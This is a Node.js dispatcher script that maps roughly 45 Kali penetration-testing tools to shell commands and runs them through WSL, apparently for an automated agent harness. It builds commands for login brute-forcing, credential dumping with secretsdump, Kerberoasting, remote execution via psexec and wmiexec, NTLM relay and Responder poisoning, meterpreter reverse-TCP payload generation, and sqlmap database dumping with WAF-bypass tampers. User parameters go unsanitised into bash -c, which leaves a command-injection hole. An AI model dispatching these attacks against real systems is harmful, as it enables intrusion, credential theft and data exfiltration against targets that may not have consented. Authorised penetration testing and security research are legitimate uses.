#!/usr/bin/env node
/**
 * SB Arsenal — Direct Kali tool dispatch. No MCP server, no .bat, no middleman.
 *
 * Maps HexStrike's 150 tool names → direct Kali WSL shell commands.
 * Integrates with: SB Proxy v6, harness executor, or standalone CLI.
 *
 * Usage (CLI):
 *   node sb-arsenal.cjs nmap_scan --target 10.10.10.5 --ports 22,80,443
 *   node sb-arsenal.cjs sqlmap_scan --url "https://target.com/page?id=1"
 *   node sb-arsenal.cjs list
 *
 * Usage (module):
 *   const arsenal = require('./sb-arsenal.cjs');
 *   const result = await arsenal.dispatch('nmap_scan', { target: '10.10.10.5', ports: '22,80,443' });
 */

const { spawn, execSync } = require('child_process');
const path = require('path');
const os = require('os');

// ═══════════════════════════════════════════════════════════════
// TOOL DEFINITIONS — maps to Kali WSL commands
// ═══════════════════════════════════════════════════════════════

const TOOLS = {
  // ── RECON ─────────────────────────────────────────────────
  "nmap_scan": {
    desc: "Port scan with service detection",
    params: ["target", "ports", "scan_type", "additional_args"],
    build: (p) => `nmap ${p.scan_type || "-sT"} ${p.ports ? "-p " + p.ports : "--top-ports 100"} ${p.additional_args || "-T4 -n --max-retries 1 --host-timeout 60s"} ${p.target}`,
  },
  "nmap_advanced_scan": {
    desc: "Full NSE script scan",
    params: ["target", "ports", "scripts"],
    build: (p) => `nmap -sV -sC ${p.scripts ? "--script " + p.scripts : ""} ${p.ports ? "-p " + p.ports : ""} ${p.target}`,
  },
  "masscan_scan": {
    desc: "Ultra-fast port scanner",
    params: ["target", "ports", "rate"],
    build: (p) => `masscan ${p.target} ${p.ports ? "-p" + p.ports : "--top-ports 100"} --rate=${p.rate || 1000}`,
  },
  "subfinder_enum": {
    desc: "Subdomain enumeration",
    params: ["domain"],
    build: (p) => `subfinder -d ${p.domain} -silent`,
  },
  "amass_enum": {
    desc: "Deep subdomain enumeration",
    params: ["domain"],
    build: (p) => `amass enum -passive -d ${p.domain} 2>/dev/null | head -100`,
  },
  "httpx_probe": {
    desc: "HTTP probe + tech detection",
    params: ["target"],
    build: (p) => `echo "${p.target}" | httpx -silent -title -tech-detect -status-code`,
  },
  "dnsx_lookup": {
    desc: "DNS resolution",
    params: ["domain", "type"],
    build: (p) => `echo "${p.domain}" | dnsx ${p.type ? "-" + p.type : ""} -silent`,
  },
  "whatweb_fingerprint": {
    desc: "Technology fingerprinting",
    params: ["target"],
    build: (p) => `whatweb ${p.target} 2>/dev/null | head -20`,
  },
  "theharvester_osint": {
    desc: "Email/subdomain/name harvesting",
    params: ["domain", "source"],
    build: (p) => `theHarvester -d ${p.domain} -b ${p.source || "google"} 2>/dev/null | head -50`,
  },

  // ── WEB SCANNING ──────────────────────────────────────────
  "nuclei_scan": {
    desc: "Vulnerability scanner (CVE, misconfig)",
    params: ["target", "severity", "templates", "timeout"],
    build: (p) => `nuclei -u ${p.target} -silent ${p.severity ? "-severity " + p.severity : "-severity critical,high,medium"} ${p.templates ? "-t " + p.templates : ""} -timeout ${p.timeout || 120}`,
  },
  "ffuf_dir": {
    desc: "Directory/file fuzzer",
    params: ["url", "wordlist", "timeout"],
    build: (p) => `ffuf -u "${p.url}${p.url.includes("FUZZ") ? "" : "/FUZZ"}" -w ${p.wordlist || "/usr/share/wordlists/dirb/common.txt"} -t 50 -timeout ${p.timeout || 10} -fc 404 -silent 2>/dev/null | head -50`,
  },
  "gobuster_dir": {
    desc: "Directory brute-force",
    params: ["url", "wordlist", "timeout"],
    build: (p) => `gobuster dir -u ${p.url} -w ${p.wordlist || "/usr/share/wordlists/dirb/common.txt"} -q -t 30 --timeout ${p.timeout || 10}s 2>/dev/null | head -50`,
  },
  "feroxbuster_dir": {
    desc: "Fast recursive content discovery",
    params: ["url", "depth"],
    build: (p) => `feroxbuster -u ${p.url} --depth ${p.depth || 2} --silent 2>/dev/null | head -50`,
  },
  "nikto_scan": {
    desc: "Web server vulnerability scan",
    params: ["target"],
    build: (p) => `nikto -h ${p.target} -Format text 2>/dev/null | head -60`,
  },
  "wpscan_scan": {
    desc: "WordPress vulnerability scanner",
    params: ["url"],
    build: (p) => `wpscan --url ${p.url} --no-banner 2>/dev/null | head -80`,
  },

  // ── SQL INJECTION ─────────────────────────────────────────
  "sqlmap_scan": {
    desc: "SQL injection testing",
    params: ["url", "data", "risk", "level", "dbs", "dump"],
    build: (p) => {
      let cmd = `sqlmap -u "${p.url}" --batch --risk=${p.risk || 1} --level=${p.level || 1} --threads=3`;
      if (p.data) cmd += ` --data="${p.data}"`;
      if (p.dbs) cmd += " --dbs";
      if (p.dump) cmd += " --dump";
      return cmd;
    },
  },
  "sqlmap_tamper": {
    desc: "SQLi with WAF bypass tamper",
    params: ["url", "tamper"],
    build: (p) => `sqlmap -u "${p.url}" --batch --tamper=${p.tamper || "space2comment,between,randomcase"} --risk=3 --level=3`,
  },

  // ── BRUTE FORCE ───────────────────────────────────────────
  "hydra_brute": {
    desc: "Login brute-force",
    params: ["target", "service", "user", "pass", "userlist", "passlist"],
    build: (p) => {
      const userPart = p.userlist ? `-L ${p.userlist}` : `-l ${p.user || "admin"}`;
      const passPart = p.passlist ? `-P ${p.passlist}` : `-p ${p.pass || "password"}`;
      return `hydra ${userPart} ${passPart} ${p.target} ${p.service || "ssh"} -t 4 -W 3`;
    },
  },
  "hydra_http_form": {
    desc: "HTTP form brute-force",
    params: ["target", "form_path", "user_field", "pass_field", "fail_msg", "userlist", "passlist"],
    build: (p) => `hydra ${p.userlist ? "-L " + p.userlist : "-l admin"} ${p.passlist ? "-P " + p.passlist : "-p password"} ${p.target} http-post-form "${p.form_path}:${p.user_field || "user"}=^USER^&${p.pass_field || "password"}=^PASS^:${p.fail_msg || "incorrect"}" -t 4`,
  },
  "john_crack": {
    desc: "Hash cracking (John)",
    params: ["hashfile", "wordlist", "format"],
    build: (p) => `john ${p.hashfile} ${p.wordlist ? "--wordlist=" + p.wordlist : ""} ${p.format ? "--format=" + p.format : ""} 2>/dev/null | head -30`,
  },
  "hashcat_crack": {
    desc: "GPU hash cracking",
    params: ["hashfile", "mode", "wordlist"],
    build: (p) => `hashcat -m ${p.mode || 0} ${p.hashfile} ${p.wordlist || "/usr/share/wordlists/rockyou.txt"} --force 2>/dev/null | tail -20`,
  },

  // ── AD / WINDOWS ──────────────────────────────────────────
  "enum4linux_scan": {
    desc: "SMB/NetBIOS enumeration",
    params: ["target"],
    build: (p) => `enum4linux -a ${p.target} 2>/dev/null | head -80`,
  },
  "smbclient_enum": {
    desc: "SMB share enumeration",
    params: ["target"],
    build: (p) => `smbclient -L //${p.target} -N 2>/dev/null`,
  },
  "secretsdump": {
    desc: "Dump credentials (impacket)",
    params: ["target", "user", "pass", "domain"],
    build: (p) => `secretsdump.py ${p.domain ? p.domain + "/" : ""}${p.user || "guest"}:${p.pass || ""}@${p.target} 2>/dev/null | head -50`,
  },
  " GetUserSPNs": {
    desc: "Kerberoasting",
    params: ["target", "user", "pass", "domain"],
    build: (p) => `GetUserSPNs.py ${p.domain || "."}/${p.user}:${p.pass}@${p.target} -request 2>/dev/null`,
  },
  "psexec_exec": {
    desc: "Remote command execution (impacket)",
    params: ["target", "user", "pass", "domain", "command"],
    build: (p) => `psexec.py ${p.domain ? p.domain + "/" : ""}${p.user}:${p.pass}@${p.target} "${p.command || "whoami"}" 2>/dev/null`,
  },
  "wmiexec_exec": {
    desc: "WMI remote execution",
    params: ["target", "user", "pass", "domain", "command"],
    build: (p) => `wmiexec.py ${p.domain ? p.domain + "/" : ""}${p.user}:${p.pass}@${p.target} "${p.command || "whoami"}" 2>/dev/null`,
  },
  "ntlmrelayx": {
    desc: "NTLM relay attack",
    params: ["target", "smb_port"],
    build: (p) => `ntlmrelayx.py -tf targets.txt -smb2support 2>/dev/null &`,
  },
  "bloodhound_collect": {
    desc: "AD graph collection",
    params: ["target", "user", "pass", "domain"],
    build: (p) => `bloodhound-python -u ${p.user} -p ${p.pass} -d ${p.domain} -ns ${p.target} -c All --zip 2>/dev/null`,
  },

  // ── EXPLOITATION ──────────────────────────────────────────
  "searchsploit_search": {
    desc: "Search Exploit-DB",
    params: ["query"],
    build: (p) => `searchsploit ${p.query} 2>/dev/null | head -20`,
  },
  "msfvenom_payload": {
    desc: "Generate metasploit payload",
    params: ["platform", "arch", "format", "lhost", "lport", "payload"],
    build: (p) => `msfvenom -p ${p.payload || "windows/x64/meterpreter/reverse_tcp"} LHOST=${p.lhost || "10.0.0.1"} LPORT=${p.lport || 4444} -f ${p.format || "raw"} ${p.platform ? "--platform " + p.platform : ""} ${p.arch ? "-a " + p.arch : ""} 2>/dev/null | xxd | head -20`,
  },

  // ── NETWORK ───────────────────────────────────────────────
  "arpspoof_mitm": {
    desc: "ARP spoofing (MITM)",
    params: ["target_ip", "gateway"],
    build: (p) => `echo 'arpspoof -i eth0 -t ${p.target_ip} ${p.gateway || "10.0.0.1"}' # requires root + manual run`,
  },
  "responder_capture": {
    desc: "LLMNR/NBT-NS poisoner",
    params: ["interface"],
    build: (p) => `responder -I ${p.interface || "eth0"} -dwv 2>/dev/null &`,
  },
  "sslscan_target": {
    desc: "SSL/TLS vulnerability scan",
    params: ["target"],
    build: (p) => `sslscan ${p.target} 2>/dev/null | head -30`,
  },
  "testssl_target": {
    desc: "Comprehensive TLS testing",
    params: ["target"],
    build: (p) => `testssl ${p.target} 2>/dev/null | head -60`,
  },

  // ── FORENSICS ─────────────────────────────────────────────
  "binwalk_extract": {
    desc: "Firmware/binary extraction",
    params: ["file"],
    build: (p) => `binwalk ${p.file} 2>/dev/null | head -20`,
  },
  "volatility_analyze": {
    desc: "Memory dump analysis",
    params: ["file", "profile", "plugin"],
    build: (p) => `volatility3 -f ${p.file} ${p.plugin || "windows.info"} 2>/dev/null | head -30`,
  },
  "exiftool_metadata": {
    desc: "File metadata extraction",
    params: ["file"],
    build: (p) => `exiftool ${p.file} 2>/dev/null`,
  },
  "steghide_extract": {
    desc: "Steganography extraction",
    params: ["file", "passphrase"],
    build: (p) => `steghide extract -sf ${p.file} ${p.passphrase ? "-p " + p.passphrase : ""} 2>/dev/null`,
  },

  // ── UTILITY ───────────────────────────────────────────────
  "curl_fetch": {
    desc: "HTTP request",
    params: ["url", "method", "headers", "data"],
    build: (p) => `curl -s ${p.method ? "-X " + p.method : ""} ${p.headers || ""} ${p.data ? "-d '" + p.data + "'" : ""} "${p.url}" 2>/dev/null | head -100`,
  },
  "dig_lookup": {
    desc: "DNS lookup",
    params: ["domain", "type", "server"],
    build: (p) => `dig ${p.domain} ${p.type || "ANY"} ${p.server ? "@" + p.server : ""} +noall +answer`,
  },
  "whois_lookup": {
    desc: "WHOIS information",
    params: ["domain"],
    build: (p) => `whois ${p.domain} 2>/dev/null | head -30`,
  },
  "proxychains_nmap": {
    desc: "Nmap through proxy chain",
    params: ["target", "ports"],
    build: (p) => `proxychains nmap -sT -Pn ${p.ports ? "-p " + p.ports : ""} ${p.target} 2>/dev/null`,
  },
};

// ═══════════════════════════════════════════════════════════════
// EXECUTION ENGINE
// ═══════════════════════════════════════════════════════════════

function ensureKali() {
  try {
    execSync("wsl -d kali-linux -- true", { timeout: 60000, stdio: "pipe" });
    return true;
  } catch { return false; }
}

function runInKali(command, timeoutMs = 120000) {
  return new Promise((resolve) => {
    const proc = spawn("wsl", ["-d", "kali-linux", "--", "bash", "-c", command], {
      stdio: ["pipe", "pipe", "pipe"],
      timeout: timeoutMs,
    });

    let out = "", err = "";
    proc.stdout.on("data", d => { if (out.length < 512 * 1024) out += d; });
    proc.stderr.on("data", d => { if (err.length < 128 * 1024) err += d; });

    proc.on("close", (code) => {
      resolve({ success: code === 0, output: out || err, stdout: out, stderr: err, exitCode: code });
    });
    proc.on("error", (e) => resolve({ success: false, output: e.message, error: e.message }));
  });
}

async function dispatch(toolName, params = {}) {
  const tool = TOOLS[toolName];
  if (!tool) return { success: false, error: `Unknown tool: ${toolName}. Use 'list' to see available tools.` };

  if (!ensureKali()) return { success: false, error: "Kali WSL not available" };

  const command = tool.build(params);
  console.log(`[arsenal] ${toolName}: ${command}`);

  const result = await runInKali(command, params.timeout || 120000);
  result.tool = toolName;
  result.command = command;
  return result;
}

function listTools() {
  const categories = {};
  for (const [name, tool] of Object.entries(TOOLS)) {
    const cat = tool.desc.split(" ")[0].toLowerCase();
    if (!categories[cat]) categories[cat] = [];
    categories[cat].push({ name, desc: tool.desc });
  }
  return { total: Object.keys(TOOLS).length, categories };
}

// ═══════════════════════════════════════════════════════════════
// CLI
// ═══════════════════════════════════════════════════════════════

if (require.main === module) {
  const args = process.argv.slice(2);
  const toolName = args[0];

  if (!toolName || toolName === "list") {
    const info = listTools();
    console.log(`\nSB Arsenal — ${info.total} tools available\n`);
    for (const [cat, tools] of Object.entries(info.categories)) {
      console.log(`  ${cat}:`);
      tools.forEach(t => console.log(`    ${t.name.padEnd(25)} ${t.desc}`));
    }
    console.log(`\nUsage: node sb-arsenal.cjs <tool> --param value ...`);
    process.exit(0);
  }

  // Parse --param value pairs
  const params = {};
  for (let i = 1; i < args.length; i++) {
    if (args[i].startsWith("--")) {
      const key = args[i].substring(2);
      const value = args[i + 1] && !args[i + 1].startsWith("--") ? args[++i] : true;
      params[key] = value;
    }
  }

  dispatch(toolName, params).then(result => {
    if (result.success) {
      console.log(result.output);
    } else {
      console.error(`Error: ${result.error || result.output}`);
      process.exit(1);
    }
  });
}

module.exports = { TOOLS, dispatch, listTools, runInKali };
